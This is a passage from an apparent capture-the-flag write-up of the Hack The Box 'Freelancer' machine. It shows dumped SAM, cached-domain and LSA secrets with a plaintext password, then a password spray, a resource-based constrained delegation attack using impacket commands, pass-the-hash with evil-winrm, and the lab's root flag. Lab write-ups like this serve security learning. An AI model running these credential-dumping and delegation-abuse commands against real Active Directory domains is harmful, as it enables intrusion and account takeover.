Impacket v0.12.0.dev1+20240327.181547.f8899e65 - Copyright 2023 Fortra                         
                                                                                                                                                                                              
[*] Target system bootKey: 0xaeb5f8f068bbe8789b87bf985e129382                                                                                                                                 
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)                                                                                                                                          
Administrator:500:aad3b435b51404eeaad3b435b51404ee:725180474a181356e53f4fe3dffac527:::                                                                                                                                        
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                 
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                       
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:04fc56dd3ee3165e966ed04ea791d7a7:::                                                                                                   
[*] Dumping cached domain logon information (domain/username:hash)                                                                                                                            
FREELANCER.HTB/Administrator:$DCC2$10240#Administrator#67a0c0f193abd932b55fb8916692c361: (2023-10-04 12:55:34)                                                                                                                
FREELANCER.HTB/lorra199:$DCC2$10240#lorra199#7ce808b78e75a5747135cf53dc6ac3b1: (2023-10-04 12:29:00)                                                                                                                          
FREELANCER.HTB/liza.kazanof:$DCC2$10240#liza.kazanof#ecd6e532224ccad2abcf2369ccb8b679: (2023-10-04 17:31:23)                                                                                  
[*] Dumping LSA Secrets                                                                        
[*] $MACHINE.ACC                                                                                                                                                                              
$MACHINE.ACC:plain_password_hex:a680a4af30e045066419c6f52c073d738241fa9d1cff591b951535cff5320b109e65220c1c9e4fa891c9d1ee22e990c4766b3eb63fb3e2da67ebd19830d45c0ba4e6e6df93180c0a7449750655edd78eb848f757689a6889f3f8f7f6cf53e1
196a528a7cd105a2eccefb2a17ae5aebf84902e3266bbc5db6e371627bb0828c2a364cb01119cf3d2c70d920328c814cad07f2b516143d86d0e88ef1504067815ed70e9ccb861f57394d94ba9f77198e9d76ecadf8cdb1afda48b81f81d84ac62530389cb64d412b784f0f733551a6
2ec0862ac2fb261b43d79990d4e2bfbf4d7d4eeb90ccd7dc9b482028c2143c5a6010                                                                                                                          
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:1003ddfa0a470017188b719e1eaae709                                                                                                               
[*] DPAPI_SYSTEM                                                                                                                                                                              
dpapi_machinekey:0xcf1bc407d272ade7e781f17f6f3a3fc2b82d16bc                                                    
dpapi_userkey:0x6d210ab98889fac8829a1526a5d6a2f76f8f9d53                                                       
[*] NL$KM                                                                                                                                                                                     
 0000   63 4D 9D 4C 85 EF 33 FF  A5 E1 4D E2 DC A1 20 75   cM.L..3...M... u                                                                                                                   
 0010   D2 20 EA A9 BC E0 DB 7D  BE 77 E9 BE 6E AD 47 EC   . .....}.w..n.G.                                                                                                                   
 0020   26 02 E1 F6 BF F5 C5 CC  F9 D6 7A 16 49 1C 43 C5   &.........z.I.C.                                                                                                                   
 0030   77 6D E0 A8 C6 24 15 36  BF 27 49 96 19 B9 63 20   wm...$.6.'I...c                                     
NL$KM:634d9d4c85ef33ffa5e14de2dca12075d220eaa9bce0db7dbe77e9be6ead47ec2602e1f6bff5c5ccf9d67a16491c43c5776de0a8c6241536bf27499619b96320                                                                                        
[*] _SC_MSSQL$DATA                                     
(Unknown User):PWN3D#l0rr@Armessa199                   
[*] Cleaning up...
```

We obtained the plaintext `PWN3D#l0rr@Armessa199` . Spraying the password against our username wordlist, we got a valid login as lorra199.

```
$ crackmapexec smb 10.10.11.5 -u users.lst  -p 'PWN3D#l0rr@Armessa199' --continue-on-success                                 
SMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
...[SNIP]...
SMB         10.10.11.5      445    DC               [+] freelancer.htb\lorra199:PWN3D#l0rr@Armessa199
```

Conveniently, earlier enumeration showed that lorra199 was a member of the Remote Management Users group, and thus we could gain remote access through WinRM.

## Shell as Administrator
### AD Attack Paths Enumeration
At this point, I returned to my BloodHound results to enumerate for attack paths from Owned Principals. However, the built-in queries did not return any paths to Domain Admin, so I performed manual enumeration.

Interestingly, lorra199 is a member of the AD Recycle Bin group.

![lorra199 groups](/assets/img/2024-10-15-htb-freelancer/lorra199-groups.png)

Members in this group are allowed to read deleted Active Directory objects, which may reveal sensitive information.

```powershell
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

This did not return anything interesting that could be used to escalate privileges.

### Resource-Based Constrained Delegation (RBCD)
The AD Recycle Bin group had GenericWrite privileges over the domain controller, DC.FREELANCER.HTB. This was unexpected as the privilege is not configured by default for the group. This allowed us to perform an RBCD attack through the AD Recycle Bin group membership.

![AD Recycle Bin Group has GenericWrite privileges](/assets/img/2024-10-15-htb-freelancer/GenericWrite.png)

In RBCD, computers specify who they trust and who can delegate authentication to them. The attack is performed by modifying the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of the domain controller with a computer account that we control, and obtaining the service ticket of the domain administrator to escalate privileges. Again, the RBCD attack was performed remotely to avoid dealing with Windows Defender when uploading binaries (i.e Rubeus).

```
# Add a computer account
impacket-addcomputer -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Password@123' -dc-ip
10.10.11.5 'FREELANCER.HTB/lorra199:PWN3D#l0rr@Armessa199'
# Configuring RBCD
impacket-rbcd -delegate-from 'ATTACKERSYSTEM$' -delegate-to DC$ -dc-ip 10.10.11.5 -action
'write' 'FREELANCER.HTB/lorra199:PWN3D#l0rr@Armessa199'
# Obtain the service ticket of the administrator
impacket-getST -spn cifs/DC.FREELANCER.HTB -impersonate administrator -dc-ip 10.10.11.5
'FREELANCER.HTB/ATTACKERSYSTEM$:Password@123'
# Use the administrator’s Kerberos ticket
export KRB5CCNAME=administrator.ccache
# Dump secrets
impacket-secretsdump -k -target-ip 10.10.11.5 DC.FREELANCER.HTB
```

I had to dump the secrets from the DC to obtain the administrator’s NTLM hash because impacket’s PsExec was being blocked by Windows Defender.

![secretsdump](/assets/img/2024-10-15-htb-freelancer/secretsdump.png)

This allowed us to escalate privileges to domain admin and obtain the root flag.

```
$ evil-winrm -i 10.10.11.5 -u Administrator -H '0039318f1e8274633445bce32ad1a290' ...[SNIP]...
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
freelancer\administrator
```

Root flag: bb7672c73d26fd1326d09fb27de9352b

## Beyond Root

```powershell
Get-MpThreatDetection
```

![Get-MpThreatDetection](/assets/img/2024-10-15-htb-freelancer/Get-MpThreatDetection.png)

We note that PsExec was failing because of AV protection.

In addition, we could have used an alternate solution to gain the initial foothold. Instead of bypassing AV to get a reverse shell as sql_svc, we could have used the SQL terminal to enumerate the file system and eventually discovered the credentials for mikasaAckerman. This would have gained us a shell as the user without needing to bypass AV restrictions.